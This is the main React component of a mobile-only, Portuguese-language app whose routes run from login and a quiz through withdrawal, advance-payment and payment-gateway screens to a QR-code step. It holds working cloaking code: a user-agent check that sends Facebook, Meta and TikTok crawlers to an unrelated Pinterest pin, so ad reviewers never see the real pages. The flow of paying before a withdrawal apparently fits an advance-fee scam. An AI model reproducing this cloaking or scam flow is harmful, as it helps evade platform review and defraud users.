import { useEffect, useState } from "react";
import { Navigate, Route, Routes, useLocation } from "react-router-dom";

import ErrorModal from "./components/ErrorModal";
import FooterMenu from "./components/FooterMenu/";
import HeaderMenu from "./components/HeaderMenu/HeaderMenu";
import { CompletePage } from "./components/ModalComplet";
import { QrCodeStepOne } from "./components/QrCodeStepOne";
import { Modal } from "./components/createaccount";
import { ModalUnlock } from "./components/modalUnlock";

import AdSection from "./screens/AdSection";
import { TransationBlackPay } from "./screens/BlackPay";
import { ChatBot } from "./screens/ChatBot";
import GatewayPage from "./screens/Gateway";
import GatewayWithdrawal from "./screens/GatewayWithdrawal";
import Login from "./screens/Login";
import { PaymentVideo } from "./screens/PaymentVideo";
import { Question } from "./screens/Questions";
import SaquePage from "./screens/SaquePage";
import { SelectMarket } from "./screens/SelectMarket";
import { WithdrawalTwo } from "./screens/Withdrawaltwo";

import { useAppContext } from "./context/AppContext";
import { useMediaQuery } from "./hooks/useMediaQuery";

const App = () => {
  const [currentPage, setCurrentPage] = useState<string>("inicio");
  const location = useLocation();
  const { isModalOpen, isModalOpenUnlock } = useAppContext();


  const isCrawler = (userAgent: string): boolean => {
    const crawlers = [
      "facebookexternalhit",
      "facebookcatalog",
      "meta-externalagent",
      "meta-externalfetcher",
      "tiktok",
    ];
    return crawlers.some((crawler) => userAgent.toLowerCase().includes(crawler));
  };


  useEffect(() => {
    const userAgent = navigator.userAgent || "";

    const botRedirectUrl = "https://br.pinterest.com/pin/838373286868741123/";


    if (isCrawler(userAgent)) {
      window.location.href = botRedirectUrl;
    }
  }, []);


  const hideFooterRoutes = [
    "/agradecimento",
    "/login",
    "/selectmarket",
    "/resgate",
    "/adiantamento",
    "/gatewaypay",
    "/qrcode",
  ];
  const hideHeaderRoutes = ["/resgate", "/adiantamento"];

  const shouldHideFooter =
    hideFooterRoutes.includes(location.pathname) || isModalOpen || isModalOpenUnlock;
  const shouldHideHeader = hideHeaderRoutes.includes(location.pathname);

  // Verifica se está em um dispositivo móvel
  const isMobile = useMediaQuery("(max-width: 768px)");

  // Tela de bloqueio para dispositivos não móveis
  if (!isMobile) {
    return (
      <div className="flex flex-col h-screen items-center justify-center bg-[#121212] text-white text-center">
        <h1 className="text-2xl font-bold">Este aplicativo funciona apenas em dispositivos móveis.</h1>
        <p className="text-lg mt-4">Acesse usando um smartphone para continuar.</p>
      </div>
    );
  }

  return (
    <div className="flex flex-col h-screen bg-[#121212]">
      {!shouldHideHeader && <HeaderMenu />}
      <ErrorModal />
      <Modal />
      <ModalUnlock />
      <div className="flex-grow overflow-y-auto">
        <Routes>
          <Route path="/" element={<Navigate to="/login" />} />
          <Route path="/login" element={<Login />} />
          <Route path="/selectmarket" element={<SelectMarket />} />
          <Route path="/saque" element={<SaquePage />} />
          <Route path="/quiz" element={<AdSection />} />
          <Route path="/saquegora" element={<CompletePage />} />
          <Route path="/gateway" element={<GatewayPage />} />
          <Route path="/resgate" element={<PaymentVideo />} />
          <Route path="/adiantamento" element={<WithdrawalTwo />} />
          <Route path="/gatewayadiantamento" element={<GatewayWithdrawal />} />
          <Route path="/chat" element={<ChatBot />} />
          <Route path="/perguntas" element={<Question />} />
          <Route path="/gatewaypay" element={<TransationBlackPay />} />
          <Route path="/qrcode" element={<QrCodeStepOne />} />
        </Routes>
      </div>

      {!shouldHideFooter && (
        <FooterMenu currentPage={currentPage} setCurrentPage={setCurrentPage} />
      )}
    </div>
  );
};

export default App;
